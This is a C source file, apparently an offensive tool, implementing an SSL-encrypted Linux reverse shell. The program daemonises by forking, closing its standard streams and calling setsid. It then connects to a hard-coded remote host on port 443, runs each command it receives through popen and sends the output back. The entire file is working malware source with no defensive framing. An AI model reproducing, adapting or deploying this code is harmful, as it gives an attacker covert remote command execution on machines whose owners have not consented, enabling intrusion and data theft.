#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <openssl/err.h>



/**************************************************
*                                                 *     
*      SSL based Linux Reverse-Shell              *
*      Author : A-mIn3                            *
*                                                 *                       
**************************************************/


#define PORT                                443
#define IP                            "a.b.c.d"

typedef struct {
        int sslfd;
        SSL *sslhandle;
        SSL_CTX *sslctx;
}sslsocket;


void ssl_init(){
        SSL_library_init();
        OpenSSL_add_all_algorithms();
}


void ssl_shutdown(sslsocket* s){
        close(s->sslfd);
        SSL_shutdown(s->sslhandle);
        SSL_CTX_free(s->sslctx);

}

int plain_connect(){

        int s_sock;
        struct  sockaddr_in     s_addr ;
        socklen_t               sin_size;


        s_addr.sin_family       = AF_INET;
        s_addr.sin_port         = htons(PORT);
        s_addr.sin_addr.s_addr  = inet_addr(IP);


        memset(&(s_addr.sin_zero),'\0',8);

        if((s_sock = socket(PF_INET, SOCK_STREAM, 0))==-1)
                exit(EXIT_FAILURE);
        if(connect(s_sock, (struct sockaddr *)&s_addr, sizeof(s_addr))==-1)
              return 0;

        return s_sock;
}


int  ssl_connect(sslsocket* s){

        s->sslfd = plain_connect();
        if(s->sslfd){

                ssl_init();
                s->sslctx = SSL_CTX_new(SSLv23_client_method());
                s->sslhandle= SSL_new(s->sslctx);
                if(!SSL_set_fd(s->sslhandle, s->sslfd))
                        return 0;
                if(SSL_connect(s->sslhandle)!=1)
                        return 0;

        }else
        
                return 0;

        return 1;

}




void main(void){


        int                     nbytes, recv_length, one=1;
        sslsocket*              sslsock;
        char                    cmd[1024];
        char                    cmd_output[1024];
        FILE *                  pipe_fin;
        int                     first = 0 ;

        sslsock = (sslsocket *)malloc(sizeof(sslsocket));
        sslsock->sslfd     = 0;
        sslsock->sslhandle = NULL;
        sslsock->sslctx    = NULL;

        switch(fork()){

                case -1:
                                exit(EXIT_FAILURE);
                case 0 :

                        close(0);
                        close(1);
                        close(2);

                        setsid();
                        chdir("/");



                while(1){

                        memset(cmd ,'\0', sizeof(cmd));
                        memset(cmd_output, '\0', sizeof(cmd_output));

                        if(first!=0)
                                sleep(5000);

                        else
                                first=1;

                        if(ssl_connect(sslsock)==0){

                                exit(EXIT_FAILURE);
                        }

                         SSL_write(sslsock->sslhandle,">>",2);
                        recv_length = SSL_read(sslsock->sslhandle, &cmd, sizeof(cmd)-6);


                        while(recv_length>0){

                                cmd[recv_length-1]='\0';
                                if(strcmp(cmd, "quit")==0){
                                        ssl_shutdown(sslsock);
                                        break;
                                }
                                pipe_fin = popen(strcat(cmd," 2>&1"), "r");

                                while((nbytes = read(fileno(pipe_fin), &cmd_output, sizeof(cmd_output)-1))!=-1){

                                        if(nbytes>0){
                                                cmd_output[nbytes]='\0';
                                                SSL_write(sslsock->sslhandle, &cmd_output, nbytes);
                                        }

                                        else
                                                break;

                                        }

                                        SSL_write(sslsock->sslhandle, ">>", 2);
                                        recv_length = SSL_read(sslsock->sslhandle, &cmd, sizeof(cmd));
                                        cmd[recv_length] = '\0';
                                        memset(cmd_output, '\0', sizeof(cmd_output));


                                        fclose(pipe_fin);


                                }


                        }


                default:
                       exit(0);


        }




}
